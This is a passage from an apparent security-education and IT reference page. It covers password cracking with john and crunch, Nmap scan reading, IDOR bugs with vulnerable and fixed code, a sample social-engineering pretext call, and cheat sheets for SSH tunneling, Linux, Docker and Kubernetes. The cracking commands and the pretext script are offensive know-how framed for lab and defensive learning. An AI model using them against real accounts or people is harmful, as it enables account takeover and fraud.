john --show captured_hashes.txt

# Generating a custom wordlist tailored to a target organization
# (combining names, years, seasons — the patterns real humans use)
crunch 8 12 -t Company%%%%2026 -o custom_list.txt

Notice these all happen offline, against a hash you already obtained through some other authorized step (a captured NTLM hash, a leaked database dump in a CTF, etc). Offline cracking generates zero log entries on the target — which is exactly why protecting hashes at rest matters as much as protecting the passwords themselves.

Why this matters for defense

MFA turns a successful guess into a near-miss

Every attack above ends the same way without multi-factor authentication: a correct guess equals a compromised account. With MFA enabled, a correct password guess becomes merely a "huh, someone has my password" signal — assuming the user doesn't reflexively approve the resulting push notification. You can't make someone make the right choice, yet you can pick up the pieces afterwards: you can't force every user to scrutinize an MFA prompt before tapping "Approve," but you can configure number-matching MFA, conditional access policies, and anomaly alerts so that a careless tap doesn't automatically become a breach.

Beginner

Reading an Nmap Scan Like a Pro

Scope first

Only scan what you're authorized to scan

Network scanning against systems you don't own or have written authorization to test can be illegal — even a "harmless" port scan can trigger intrusion alerts, violate acceptable-use policies, or break laws depending on jurisdiction. Everything below assumes a home lab, a CTF range, or a signed engagement scope document. The goal is to understand what a scan is actually telling you — both as an attacker's recon step and as something your own monitoring tools should be able to detect.

Concept

What a port scan is actually asking

A port scan sends carefully-crafted packets to a range of ports and studies the responses to infer what's running. It's less "breaking in" and more "knocking on every door on the street and noting which ones answer, which ones politely say 'go away,' and which ones never respond at all." Each of those three outcomes means something different — and confusing them is the most common beginner mistake.

Nmap stateWhat it meansWhy it matters
openSomething is actively listening and accepted the connection attemptA real, running service — the most actionable finding
closedThe host responded, but explicitly said "nothing is listening here"Confirms the host is alive and reachable; just not on this port
filteredNo response came back at all — a firewall is likely silently dropping the probeTells you about a defense being present, even though you learned nothing about the service behind it
Hands-on (lab only)

Reading real scan output

# A common starting scan against a lab target
nmap -sV -sC -p- 192.168.56.10

# Sample output, annotated:
#
# PORT     STATE  SERVICE      VERSION
# 22/tcp   open   ssh          OpenSSH 8.9p1 Ubuntu       <- version banner: a clue for vuln research
# 80/tcp   open   http         Apache httpd 2.4.52        <- web server; worth browsing manually
# 139/tcp  open   netbios-ssn  Samba smbd 4.15.13-Ubuntu  <- file sharing; check for anonymous access
# 445/tcp  open   microsoft-ds Samba smbd 4.15.13-Ubuntu
# 3306/tcp closed mysql                                   <- reachable host, but DB isn't exposed here
#
# |_http-title: Apache2 Ubuntu Default Page: It works    <- script output: default page = likely fresh install

# -sV  : detect service/version banners
# -sC  : run nmap's default safe script set (banner grabs, basic enum)
# -p-  : scan all 65,535 ports, not just the common 1,000
# (this is noisy and slow — fine in a lab, a giveaway in a real engagement)

Notice how much you can infer before exploiting anything: an outdated Apache banner suggests checking for known CVEs; an exposed Samba share suggests testing for anonymous (null session) access; a default "It works" page suggests the box was stood up quickly and may not have been hardened yet. Recon is where most of the real thinking happens — exploitation is often the easy part once you understand what you're looking at.

Mindset

Assume makes an ass out of you and me

A "filtered" port doesn't mean "nothing is there" — it might mean a firewall is hiding a critical service from casual scanning. And an "open" port running a service with a familiar name doesn't guarantee it's actually that service — administrators sometimes run things on nonstandard ports specifically to throw off scans like this. Treat every scan result as a hypothesis to verify, not a fact to act on.

Beginner

Web App Basics – Finding Your First IDOR (Lab Practice)

Scope first

Practice on intentionally vulnerable apps, not live targets

IDOR (Insecure Direct Object Reference) is one of the most common — and most beginner-friendly — web vulnerabilities to learn, because it requires no special tools, just careful observation and a willingness to change one number in a URL. Practice it on platforms built for that purpose: OWASP Juice Shop, DVWA, PortSwigger's free Web Security Academy labs, or HackTheBox/TryHackMe boxes. Trying this against a real company's website without written authorization is unauthorized access — full stop, regardless of how "easy" the bug looks.

Concept

The bug, in one sentence

An IDOR happens when an application lets you access an object — an invoice, a user profile, an uploaded file — purely by referencing its ID, without checking whether you're actually allowed to see it. The application correctly checks "are you logged in?" but skips the second, equally important question: "are you logged in as someone who's allowed to see this specific thing?"

Hands-on (lab only)

Spotting the pattern

# You log in as yourself and view your own invoice. The URL looks like:
https://shop.example.lab/invoices/4471

# Out of curiosity, you change the number by one:
https://shop.example.lab/invoices/4470

# If the application returns SOMEONE ELSE'S invoice — full name,
# address, items purchased — instead of an "access denied" page,
# you've just found an IDOR. The fix the developer needs to make
# is conceptually simple:

# VULNERABLE — trusts the ID in the URL completely
def get_invoice(invoice_id):
    return db.query("SELECT * FROM invoices WHERE id = ?", invoice_id)

# FIXED — also verifies the invoice actually belongs to the requester
def get_invoice(invoice_id, current_user):
    invoice = db.query("SELECT * FROM invoices WHERE id = ?", invoice_id)
    if invoice is None or invoice.owner_id != current_user.id:
        raise PermissionError("Not your invoice")
    return invoice

That's genuinely the whole bug class — "the server checked *what* but not *who*." Once you can spot the pattern, you'll start noticing it in URLs, API requests, and form fields everywhere: numeric IDs, sequential filenames, predictable tokens. The hunting skill transfers far more than any specific tool does.

Mindset

Assume makes an ass out of you and me — including about your own code

If you're the one writing the application, the natural assumption is "well, why would anyone change the number in the URL?" That single assumption is the entire vulnerability. Defensive development means assuming every input — URL parameters, form fields, API payloads, cookies — will eventually be tampered with by someone curious, malicious, or simply running an automated scanner, and verifying authorization on every single request rather than trusting that users will only ask for things they're "supposed to."

Beginner

Social Engineering 101 – Why Pretexting Works on Smart People Too

Concept

Social engineering targets a person, not a system

Every technical control in the world — firewalls, MFA, encryption — can be routed around with a single well-placed phone call to the right person at the right moment. Social engineering is the practice of manipulating people into taking actions or revealing information they normally wouldn't, by exploiting very human instincts: the desire to be helpful, the discomfort of questioning authority, and the urge to resolve an "urgent" problem quickly.

It's worth saying plainly: falling for a well-executed pretext is not a sign of being unintelligent. These techniques are specifically engineered to bypass careful thinking by creating time pressure and emotional urgency. Authorized social engineering tests exist to find these gaps before a real attacker does — and to build organizational "muscle memory" for spotting them.

Concept

Pretexting: building a believable fictional scenario

A pretext is the invented backstory an attacker uses to justify their request — "I'm from IT and your account is locked," "I'm a vendor following up on an overdue invoice," "I'm the new contractor and I can't find the badge office." The strongest pretexts share a few traits:

ElementWhy it works
PlausibilityIt fits naturally into the target's normal routine — nothing about it stands out as unusual on its own.
AuthorityIt borrows credibility from a role people are conditioned not to question — IT, a manager, an auditor, law enforcement.
UrgencyIt compresses the decision window so the target acts before doubt has time to form: "I need this in the next ten minutes or the whole team is blocked."
A small, reasonable-sounding askRarely "give me your password." More often "can you just confirm the last four digits" or "can you read me the code that just texted you."
Concept

A walkthrough of a realistic (and entirely plausible) pretext call

# A composite example based on patterns seen across real engagements
# (names and details fictionalized):

Caller: "Hi, this is Alex from the IT helpdesk -- we're seeing some
        unusual login attempts on your account and we want to lock
        it down before anything happens. Can you confirm the email
        you usually log in with?"

Target: "Sure, it's j.martinez@company.com"

Caller: "Great, thanks. I'm sending a verification code to that address
        right now to confirm it's really you -- can you read that back
        to me once it arrives? That's how we'll know we're securing the
        right account."

# What's actually happening: the "verification code" is a real
# password-reset code the attacker just triggered. If the target
# reads it back, the attacker now controls the account --
# and the target believed, the entire time, that they were
# the one being protected.

Notice that nothing in this script sounds outlandish — that's exactly the point. The defense isn't "be more suspicious of everyone forever" (that's exhausting and corrosive to a healthy workplace). It's a single habit: verify identity through a separate, known channel before acting on an unusual request — hang up and call the helpdesk's published number, message your manager directly, confirm with the vendor through the contact on file rather than the one the caller provided.

Concept

When the test "works," the org learns something — not the employee

A properly run social engineering assessment treats a successful pretext as a finding about the organization's processes and training — not a referendum on any one person's intelligence or character. "Not my circus, not my monkey" is exactly the wrong instinct here on both sides: for the tester, every finding belongs to the org's broader security posture, not just the one department tested; and for the employee who got got, it's genuinely everyone's circus — which is precisely why the fix is shared training, clear verification procedures, and a culture where saying "let me verify that and call you back" is treated as competence, not obstruction.

FHS · Permissions · Boot Process · Signals · systemd · RAID · Hardware ▾
🗂️ Linux Filesystem Hierarchy (FHS) DIRECTORY TREE ▶
Diagram — Directory Tree
Filesystem Hierarchy Standard — Linux Directory Structure
Everything begins at root /. The FHS defines the purpose of each directory.
/ Root of the entire hierarchy
├─ bin/ Essential user binaries: ls, cp, mv, grep, cat
├─ sbin/ System admin binaries: fdisk, iptables, init, fsck
├─ etc/ System-wide config files: passwd, fstab, hosts, ssh/
├─ home/ User home directories: /home/alice, /home/bob
├─ root/ Root user's home — NOT inside /home
├─ var/ Variable data — logs, spool, mail, databases
└─ var/log/ System logs: auth.log, syslog, kern.log
├─ tmp/ Temporary files; typically cleared on reboot
├─ usr/ Secondary hierarchy — non-essential user programs
├─ usr/bin/ Non-essential user binaries: git, python3, vim
├─ usr/lib/ Shared libraries for /usr/bin and /usr/sbin
└─ usr/share/ Arch-independent data: man pages, icons
├─ lib/ Shared libraries for /bin & /sbin; kernel modules
├─ dev/ Device files: /dev/sda, /dev/null, /dev/random
├─ proc/ Virtual FS: /proc/cpuinfo, /proc/meminfo, /proc/PID/
├─ sys/ Virtual FS (sysfs): hardware & kernel device info
├─ mnt/ Temporary mount point for filesystems
├─ media/ Auto-mounted removable media: USB, CD/DVD
├─ opt/ Optional / third-party software packages
├─ srv/ Service data: web root, FTP content
└─ boot/ Bootloader files: vmlinuz, initrd.img, grub/

🚀 Linux Boot Process (BIOS/UEFI → systemd) BOOT CHAIN ▶
Sequence Diagram
Full Linux Boot Chain — Firmware to Login
1 — BIOS / UEFI Firmware
Hardware POST · Locate bootable device via boot order · UEFI reads EFI System Partition (ESP)
2 — MBR / GPT Partition Table
Read first sector for MBR (legacy) or GUID Partition Table (UEFI) · Locate boot partition
3 — GRUB2 Bootloader
Presents boot menu · Loads compressed kernel image (vmlinuz) + initramfs into RAM
4 — Kernel Initialization
Decompresses itself · Probes hardware · Loads drivers · Mounts initramfs as temporary root
5 — initramfs / initrd
Temporary root FS in RAM · Provides drivers needed to mount real root filesystem from disk
6 — systemd (PID 1)
First real process · Reads unit files · Manages targets (runlevels) · Starts services in parallel
7 — Login / TTY / Display Manager
getty for console · GDM/LightDM for GUI · User session starts · PAM handles authentication
🔐 SSH — Commands, Keys & Tunneling COMPLETE REFERENCE ▶
Reference — Source: SSH Cheat Sheet
SSH · SCP · SFTP · ssh-keygen · Tunneling
Secure Shell listens on TCP port 22 by default. Uses asymmetric crypto for key exchange, symmetric for session data. Replaces Telnet/FTP/rsh. Config files: ~/.ssh/config (client) · /etc/ssh/sshd_config (server).
BASIC CONNECTION COMMANDS
# Connect to remote host ssh user@hostname # Default port 22 ssh -p 3344 user@hostname # Custom port ssh -i ~/.ssh/key.pem user@1.2.3.4 # Specific identity file ssh user@host 'ls -la /var/log' # Execute remote command inline ssh user@host bash < script.sh # Run local script remotely # Compress traffic (useful on slow links) ssh -C user@hostname # X11 forwarding (run GUI apps remotely) ssh -X user@hostname # Trusted X11 forwarding ssh -Y user@hostname # Less secure — full display forward
SSH KEY MANAGEMENT (ssh-keygen)
# Generate key pair (RSA 4096-bit, labeled with email) ssh-keygen -t rsa -b 4096 -C "you@email.com" # Generate modern Ed25519 key (preferred — smaller, faster) ssh-keygen -t ed25519 -C "you@email.com" # Other key management commands ssh-keygen -F hostname # Check if host is in known_hosts ssh-keygen -R hostname # Remove host from known_hosts ssh-keygen -y -f private.key # Derive public key from private key ssh-keygen -p -f ~/.ssh/id_rsa # Change key passphrase ssh-copy-id user@server # Install public key to remote host # Key files reference # ~/.ssh/id_rsa — private key (protect with chmod 600) # ~/.ssh/id_rsa.pub — public key (safe to share) # ~/.ssh/known_hosts — trusted hosts (auto-populated) # ~/.ssh/authorized_keys — keys permitted to log in here
SCP — SECURE COPY
scp user@server:/remote/file.txt ./local/ # Remote → local scp ./local/file.txt user@server:/remote/ # Local → remote scp -r user@server:/folder ./local/ # Recursive (directory) scp -P 8022 user@server:/file ./ # Custom port (-P uppercase) scp -C user@server:/big_file ./ # Enable compression scp user1@host1:/file user2@host2:/dest # Server-to-server
SSH TUNNELING — PORT FORWARDING
# LOCAL (-L): Forward local_port → remote_host:remote_port via SSH server # Access internal service on remote network as if it were local ssh -L 8080:internal-db:5432 user@jump-host # → localhost:8080 now reaches internal-db port 5432 # REMOTE (-R): Forward remote_port on SSH server → local machine # Expose a local service through a remote public server ssh -R 9090:localhost:3000 -N -f user@public-server # → public-server:9090 now reaches your local port 3000 # DYNAMIC (-D): Create a SOCKS proxy on local_port # Route browser/app traffic through SSH server ssh -D 8888 -q -C -N -f user@remote-host # → Set browser SOCKS5 proxy to 127.0.0.1:8888 # PROXY JUMP (-J): Multi-hop through bastion host ssh -J user@bastion user@internal-host ssh -J user@hop1:port1,user@hop2:port2 user@target # Multi-hop # Flags used in tunneling # -N No remote commands — dedicated tunnel only # -f Fork to background after authentication # -q Quiet mode — suppress all warnings # -C Compress tunnel data
▸ SSH CONFIG FILE — ~/.ssh/config
# ~/.ssh/config — per-host connection settings # Avoids typing long flags every time Host myserver HostName 192.168.1.50 User admin Port 2222 IdentityFile ~/.ssh/id_ed25519 ForwardAgent yes # Now connect with just: ssh myserver # Hardening options in /etc/ssh/sshd_config PermitRootLogin no # Never allow root SSH login PasswordAuthentication no # Keys only — disable password auth X11Forwarding no # Disable unless needed AllowTcpForwarding no # Disable unless tunneling required MaxAuthTries 3 # Limit brute-force attempts Port 2222 # Change from default 22
🖥️ Tmux — Terminal Multiplexer COMPLETE REFERENCE ▶
Reference — Source: Tmux Cheat Sheet
Sessions · Windows · Panes · Copy Mode
Tmux (Terminal Multiplexer) runs persistent sessions that survive SSH disconnects. Install: sudo apt install tmux (Debian/Ubuntu) · brew install tmux (macOS). Prefix key: Ctrl+b (default) — press before every shortcut.
Session
A persistent collection of pseudo-terminals. Survives disconnect. Multiple windows inside.
Window
A single screen view (like a tab). Can contain multiple panes.
Pane
A split section of a window. Each runs its own terminal independently.
SESSION COMMANDS (from CLI)
tmux # Start new session tmux new -s mysession # New named session tmux ls # List all sessions tmux a # Attach to last session tmux a -t mysession # Attach to named session tmux kill-session -t s0 # Kill named session tmux kill-session -a # Kill ALL except current
▸ KEYBOARD SHORTCUTS (all prefixed with Ctrl+b)
Keys Action
SESSIONS
d Detach from session (session keeps running)
$ Rename current session
s List & switch sessions interactively
( / ) Switch to previous / next session
WINDOWS (TABS)
c Create new window
, Rename current window
& Close current window
p / n Previous / Next window
w List all windows (interactive)
0–9 Switch to window by number
PANES (SPLITS)
% Split pane vertically (side by side)
" Split pane horizontally (top/bottom)
Arrow keys Switch between panes
o Cycle through panes
z Zoom pane to full screen (toggle)
! Break pane out into new window
x Close current pane

⌨️ Unix / Linux Commands — Quick Reference COMPLETE REFERENCE ▶
Reference — Source: Unix Commands Cheat Sheet
I/O Redirection · Pipes · File Management · Text Processing · Processes
Commands work on any POSIX-compatible shell (bash, zsh, sh, ksh). Wildcards: * (any length) · ? (single char) · [abc] (character class).
▸ I/O REDIRECTION & PIPES
Operator Description Example
cmd1 | cmd2 Pipe: feed stdout of cmd1 to stdin of cmd2 ps aux | grep nginx
cmd > file Redirect stdout to file (overwrites) echo "hello" > out.txt
cmd >> file Append stdout to file date >> log.txt
cmd < file Read stdin from file wc -l < names.txt
cmd > /dev/null Suppress all output (discard stdout) ./script.sh > /dev/null
cmd 2>&1 Redirect stderr to stdout (combine streams) make 2>&1 | tee build.log
cmd && cmd2 Run cmd2 only if cmd1 succeeds (exit 0) make && make install
cmd || cmd2 Run cmd2 only if cmd1 fails (non-zero exit) ping host || echo "down"
cmd & Run command in background; returns to shell ./server &
cmd << EOF Heredoc: inline multi-line stdin until delimiter wc -l << EOF ... EOF
$(cmd) Command substitution: use output as argument echo "today: $(date)"
▸ FILE & DIRECTORY MANAGEMENT
# Listing and navigation ls # List current directory ls -l # Long format: perms, owner, size, date ls -a # Show hidden files (dot files) ls -lh # Human-readable sizes (KB, MB, GB) ls -lt # Sort by modified time (newest first) ls -lR # Recursive listing cd /path/to/dir # Change directory cd .. # Up one level cd ~ # Go to home directory cd - # Toggle to previous directory pwd # Print working directory # Create, copy, move, delete mkdir -p dir/sub/leaf # Create directory tree (no error if exists) cp file.txt backup/ # Copy file to directory cp -r src/ dst/ # Recursive copy (directories) cp -p file backup # Preserve permissions, timestamps mv old.txt new.txt # Rename file mv file.txt /tmp/ # Move to directory rm file.txt # Delete file rm -rf dir/ # Delete directory recursively (no prompt) ln -s target link # Create symbolic link touch file.txt # Create empty file or update timestamp
▸ TEXT VIEWING & SEARCHING
# View file content cat file.txt # Print entire file to stdout less file.txt # Page through file (q to quit) head -20 file.txt # First 20 lines tail -20 file.txt # Last 20 lines tail -f /var/log/syslog # Follow live log output # Search and filter grep "pattern" file.txt # Search in file grep -r "error" /var/log/ # Recursive search in directory grep -i "warning" file.txt # Case-insensitive grep -v "debug" file.txt # Invert match (exclude lines) grep -n "TODO" *.py # Show line numbers grep -c "fail" auth.log # Count matching lines only grep -E "\d{1,3}\.\d{1,3}" log.txt # Extended regex # Text manipulation sed 's/old/new/g' file.txt # Replace all occurrences sed -i 's/foo/bar/g' file.txt # In-place edit awk '{print $1}' file.txt # Print first field (whitespace delimited) awk -F: '{print $1,$3}' /etc/passwd # Colon delimiter, print fields 1 and 3 cut -d: -f1 /etc/passwd # Cut by delimiter, return field 1 sort file.txt # Sort lines alphabetically sort -rn file.txt # Sort numerically, reversed uniq -c file.txt # Remove duplicates, prefix with count wc -l file.txt # Count lines wc -w file.txt # Count words tr 'a-z' 'A-Z' < file.txt # Translate chars (lowercase to upper) tee output.txt # Write stdin to file AND stdout
▸ PROCESS MANAGEMENT
ps aux # All running processes (detailed) ps aux | grep nginx # Filter process list top # Interactive process viewer htop # Better interactive process viewer kill 1234 # Send SIGTERM to PID 1234 (graceful stop) kill -9 1234 # Send SIGKILL (force kill, unblockable) killall nginx # Kill all processes named nginx bg # Resume suspended job in background fg # Bring background job to foreground jobs # List background jobs in current shell nohup ./script.sh & # Run immune to SIGHUP (survives logout) disown %1 # Remove job from shell job table lsof -i :8080 # Show which process uses port 8080 strace -p 1234 # Trace system calls of running process
▸ DISK, ARCHIVES & MISC
# Disk usage df -h # Disk free space (human readable) du -sh dir/ # Directory total size du -sh * | sort -rh # Sort by size (largest first) # Archives and compression tar -czf archive.tar.gz dir/ # Create gzip-compressed tar tar -xzf archive.tar.gz # Extract gzip tar tar -cjf archive.tar.bz2 dir/ # Create bzip2-compressed tar tar -tf archive.tar.gz # List contents without extracting zip -r archive.zip dir/ # Create zip archive recursively unzip archive.zip -d /target # Extract zip to target directory # System info uname -a # Kernel name, version, arch uname -r # Kernel release version only uptime # System uptime + load averages whoami # Current username id # UID, GID and all group memberships env # List all environment variables which python3 # Full path of a command type ls # Type of command (alias/builtin/file) history # Command history history | grep ssh # Search command history man tcpdump # Manual page for any command # Finding files find / -name "*.conf" 2>/dev/null # Find by name (suppress errors) find /home -type f -newer ref.txt # Files newer than reference find / -perm /4000 2>/dev/null # Find SUID files (security audit) find / -size +100M 2>/dev/null # Files larger than 100MB locate nginx.conf # Fast find (uses database) updatedb # Rebuild locate database
💾 RAID Levels Reference STORAGE REDUNDANCY ▶
Reference — Source: A+ Cheat Sheet
Redundant Array of Independent Disks — Levels 0, 1, 5, 6, 10
RAID provides fault tolerance and/or performance. Does NOT replace backups. Minimum disk counts and failure tolerance differ by level.
Level Name Min Disks Can Lose Characteristic Use Case
RAID 0 Striping 2 0 Data split across disks; combined read/write speed. No redundancy. Scratch disks, video editing (speed > safety)
RAID 1 Mirroring 2 1 Exact copy on each disk. Half usable capacity. Fast reads, slower writes. OS drives, critical single-point protection
RAID 5 Striping + Parity 3 1 Data + parity distributed. (N-1) usable capacity. Rebuild from parity on failure. File servers, NAS; good balance of speed/redundancy
RAID 6 Double Parity 4 2 Like RAID 5 but two parity blocks. (N-2) usable capacity. Slower writes. Large arrays where double failure is a real risk
RAID 10 Stripe of Mirrors 4 1 per mirror Mirrored pairs then striped. 50% usable capacity. Excellent performance + redundancy. Databases, high-performance high-availability workloads
⚠️ RAID is NOT backup. RAID protects against drive failure only — not against ransomware, accidental deletion, corruption, or site disasters. Follow the 3-2-1 rule: 3 copies · 2 different media types · 1 offsite.

Reference — Source: A+ Cheat Sheet (220-1101)
RAM · Storage · CPU · Printer Imaging Process

Type DIMM Pins SODIMM Pins Notes

DDR2 240 200 Faster, lower voltage than DDR

Interface Max Speed Connector Notes
SATA Rev 1 1.5 Gb/s 7-pin data / 15-pin power Legacy; backward compatible
SATA Rev 2 3 Gb/s Same Common in older HDDs

M.2 Up to NVMe speed M.2 slot (key B, M, or B+M) Form factor, not protocol; can be SATA or NVMe
▸ LASER PRINTER IMAGING PROCESS (7 STEPS)
1 — Processing
Page data received; printer RIP (Raster Image Processor) converts to bitmap image in memory
2 — Charging
Primary corona wire/charge roller applies uniform negative charge (~-600V) to photosensitive drum
3 — Exposing
Laser beam neutralizes charge on drum where text/images will appear, creating a latent electrostatic image
4 — Developing
Negatively charged toner is attracted to the uncharged (exposed) areas of the drum; visible image forms
5 — Transferring
Transfer corona belt/roller applies positive charge to paper, attracting toner from drum to paper
6 — Fusing
Fuser assembly (heating element + pressure roller) melts toner permanently into paper fibers (~180°C)
7 — Cleaning
Cleaning blade scrapes residual toner off drum; erase lamp neutralizes drum charge for next cycle
🐳 Docker — Containers, Images & Compose DEVOPS · LINUX+ ▶
Container Runtime
Package Once, Run Anywhere — Container Concepts
Docker packages an application and ALL its dependencies into a container — a lightweight, isolated process that runs identically everywhere. An image is the read-only blueprint; a container is a running instance of an image.
▸ CONTAINER vs VM — KEY DIFFERENCE
FeatureVirtual MachineContainer
OSFull guest OS per VM (GBs)Shares host kernel (MBs)
Boot timeMinutesMilliseconds
IsolationHardware-level (hypervisor)Kernel namespaces + cgroups
PortabilityHypervisor-dependentRuns on any Docker host
Use caseFull OS isolation, legacy appsMicroservices, CI/CD, cloud-native
Security boundaryStrong (separate kernel)Weaker (shared kernel — escape attacks exist)
▸ DOCKERFILE — BUILD YOUR IMAGE
# Dockerfile — instructions to build an image layer by layer FROM python:3.12-slim # base image (start here) WORKDIR /app # set working directory COPY requirements.txt . # copy file from host into image RUN pip install -r requirements.txt # run command at build time COPY . . # copy rest of source code ENV PORT=8080 # set environment variable EXPOSE 8080 # document which port the app uses USER nobody # !! run as non-root (security) CMD ["python", "app.py"] # default command when container starts # CMD vs ENTRYPOINT # ENTRYPOINT ["python"] — fixed executable, cannot be overridden easily # CMD ["app.py"] — default args, overridden by: docker run img other.py # ARG vs ENV: ARG is build-time only; ENV persists into running container
▸ ESSENTIAL DOCKER COMMANDS
# ── Images ───────────────────────────────────────────────── docker build -t myapp:1.0 . # build image from Dockerfile in . docker pull nginx:alpine # download image from registry docker push myrepo/myapp:1.0 # push to Docker Hub / registry docker images # list local images docker rmi myapp:1.0 # delete image docker history myapp:1.0 # show image layers # ── Containers ───────────────────────────────────────────── docker run -d -p 8080:80 --name web nginx # run detached, port-map, named docker run -it ubuntu bash # interactive terminal docker run --rm alpine echo hello # auto-remove when done docker ps # running containers docker ps -a # all containers (inc. stopped) docker stop web # graceful stop (SIGTERM) docker kill web # immediate stop (SIGKILL) docker rm web # remove stopped container docker exec -it web bash # shell into running container docker logs -f web # stream container logs docker inspect web # full JSON metadata docker stats # live CPU/memory usage docker cp web:/app/config.yml ./ # copy file from container # ── Volumes & Networks ───────────────────────────────────── docker volume create mydata docker run -v mydata:/data alpine # named volume (persistent) docker run -v $(pwd)/data:/data alpine # bind mount (host path) docker network create mynet docker run --network mynet nginx # containers on same net can talk
▸ DOCKER COMPOSE — MULTI-CONTAINER APPS
# docker-compose.yml — define all services in one file version: "3.9" services: web: build: . # build from local Dockerfile ports: - "8080:80" environment: - DATABASE_URL=postgres://db/mydb depends_on: - db volumes: - ./static:/app/static db: image: postgres:16 environment: POSTGRES_PASSWORD: secret volumes: - pgdata:/var/lib/postgresql/data volumes: pgdata: # Compose commands docker compose up -d # start all services in background docker compose down # stop and remove containers docker compose down -v # also remove volumes docker compose logs -f web # follow logs for one service docker compose exec web bash # shell into service docker compose ps # status of all services
▸ DOCKER SECURITY HARDENING
ControlCommand / SettingWhy
Never run as rootUSER nobody in DockerfileContainer breakout = root on host if running as root
Read-only filesystem--read-only flagPrevents writing malware or modifying binaries
Drop capabilities--cap-drop ALL --cap-add NET_BIND_SERVICEPrinciple of least privilege; limits exploit impact
No privileged modeAvoid --privilegedPrivileged = full host access; nearly no isolation
Scan imagesdocker scout / trivyFind CVEs in base image and dependencies before deploy
Limit resources--memory 512m --cpus 1Prevents container consuming all host resources (DoS)
Use distroless/slimFROM gcr.io/distroless/python3Minimal attack surface — no shell, no package manager
📄 YAML — Config Language Reference DEVOPS · CONFIG ▶
YAML Ain't Markup Language
Human-Readable Data Serialisation — Docker, K8s, Ansible, GitHub Actions
YAML is the config language of modern infrastructure. Used by Docker Compose, Kubernetes, GitHub Actions, Ansible, and hundreds of other tools. Whitespace-significant — indentation defines structure. Tabs are forbidden — spaces only.
▸ SYNTAX RULES & DATA TYPES
# ── Scalars (single values) ──────────────────────────────── name: Alice # string (no quotes needed) age: 30 # integer price: 9.99 # float active: true # boolean (true/false/yes/no/on/off) nothing: null # null (or ~ or empty) quoted: "must quote: colons, #hashes, special: chars" # ── Sequences (lists) ────────────────────────────────────── fruits: # block style (preferred) - apple - banana - cherry tags: [python, docker, linux] # flow style (inline) # ── Mappings (dicts / objects) ───────────────────────────── address: # block style street: 123 Main St city: Springfield zip: "12345" # quoted to preserve leading zero point: {{x: 10, y: 20}} # flow style # ── Multi-line strings ───────────────────────────────────── literal: | # | preserves newlines exactly Line one Line two Line three folded: > # > folds newlines into spaces This is a very long sentence that continues here. # ── Anchors & aliases (DRY — Don't Repeat Yourself) ──────── defaults: &defaults image: nginx:alpine restart: always web: <<: *defaults # merge defaults into this mapping ports: ["80:80"] api: <<: *defaults # reuse same defaults ports: ["8080:80"]
▸ COMMON GOTCHAS
ProblemCauseFix
Tabs cause parse errorYAML forbids tab charactersConfigure editor: indent with 2 spaces
yes/no/on/off parsed as boolYAML 1.1 treats these as booleansQuote them: "yes", "no"
Bare strings with special chars fail: # [] {} | > @ ` have special meaningWrap value in double quotes
Wrong indentation silently ignoredItem at wrong indent level joins wrong parentUse a YAML linter (yamllint)
0644 becomes 420 (integer)Leading zero = octal in YAMLQuote file permissions: "0644"
▸ YAML IN PRACTICE — GitHub Actions Example
# .github/workflows/ci.yml name: CI Pipeline on: push: branches: [main] pull_request: jobs: test: runs-on: ubuntu-latest steps: - name: Checkout code uses: actions/checkout@v4 - name: Set up Python uses: actions/setup-python@v5 with: python-version: "3.12" - name: Install dependencies run: pip install -r requirements.txt - name: Run tests run: pytest --tb=short env: DATABASE_URL: ${{ secrets.DATABASE_URL }}
⚙️ Kubernetes — Container Orchestration Reference DEVOPS · CLOUD ▶
K8s — Google Borg → Open Source
Deploy, Scale, and Heal Containers Automatically
Kubernetes (K8s) automates deployment, scaling, and management of containerised applications. It clusters multiple machines into one compute pool and decides where each container runs. Control Plane = the brain. Worker Nodes = where workloads run.
▸ CORE OBJECTS
ObjectWhat it isAnalogy
PodSmallest deployable unit. One or more containers sharing network + storage. Ephemeral — dies and is replaced.A single server instance
DeploymentManages a set of identical Pods. Handles rolling updates, rollbacks, desired replica count.The process supervisor
ServiceStable network endpoint for a set of Pods. Types: ClusterIP (internal), NodePort, LoadBalancer, ExternalName.A load balancer
ConfigMapNon-sensitive config data (env vars, config files) injected into Pods.An .env file
SecretSensitive config (passwords, tokens). Base64-encoded (NOT encrypted by default — use Sealed Secrets or Vault).A locked .env file
NamespaceVirtual cluster within a cluster. Logical separation for teams/environments (dev/staging/prod).A project folder
IngressHTTP/HTTPS routing rules. Maps hostnames and paths to Services. Requires an Ingress Controller (nginx, traefik).A reverse proxy
PersistentVolumeCluster-level storage resource. PersistentVolumeClaim requests a piece of it.A mounted hard drive
▸ KUBECTL — ESSENTIAL COMMANDS
# ── Context & cluster ────────────────────────────────────── kubectl config get-contexts # list clusters you're connected to kubectl config use-context prod # switch cluster kubectl cluster-info # control plane endpoint # ── Explore resources ────────────────────────────────────── kubectl get pods # list Pods in current namespace kubectl get pods -n kube-system # specify namespace kubectl get pods -A # all namespaces kubectl get all # pods, services, deployments... kubectl describe pod my-pod # full details + events kubectl get deployment web -o yaml # export as YAML # ── Deploy & manage ──────────────────────────────────────── kubectl apply -f deployment.yaml # create/update from file (preferred) kubectl delete -f deployment.yaml # remove resources in file kubectl scale deployment web --replicas=5 kubectl rollout status deployment/web # watch rolling update kubectl rollout undo deployment/web # rollback to previous version # ── Debug ────────────────────────────────────────────────── kubectl logs my-pod # container logs kubectl logs my-pod -f # follow / stream logs kubectl exec -it my-pod -- bash # shell into pod kubectl port-forward pod/my-pod 8080:80 # forward port to localhost kubectl top pods # CPU/memory usage
▸ MINIMAL DEPLOYMENT MANIFEST
# deployment.yaml — the most common K8s resource apiVersion: apps/v1 kind: Deployment metadata: name: web namespace: production spec: replicas: 3 selector: matchLabels: app: web template: metadata: labels: app: web spec: containers: - name: web image: myrepo/web:1.0 ports: - containerPort: 8080 env: - name: DB_URL valueFrom: secretKeyRef: name: db-secret key: url resources: requests: {{cpu: "100m", memory: "128Mi"}} limits: {{cpu: "500m", memory: "512Mi"}} readinessProbe: httpGet: {{path: /healthz, port: 8080}} securityContext: runAsNonRoot: true readOnlyRootFilesystem: true
▸ K8s SECURITY — KEY CONTROLS
ControlWhat it does
RBACRole-Based Access Control. Roles define permissions; RoleBindings attach them to users/serviceaccounts.
NetworkPolicyFirewall rules between Pods. Default: allow all. Apply deny-all then whitelist what's needed.
PodSecurityContextrunAsNonRoot, readOnlyRootFilesystem, allowPrivilegeEscalation: false on every container.
Secrets encryptionEncrypt etcd at rest (EncryptionConfiguration). Use Sealed Secrets or Vault for GitOps workflows.
Resource limitsAlways set requests + limits. Prevents resource starvation and limits blast radius.
Image scanningScan in CI (trivy, Grype) and at admission (Kyverno, OPA Gatekeeper).
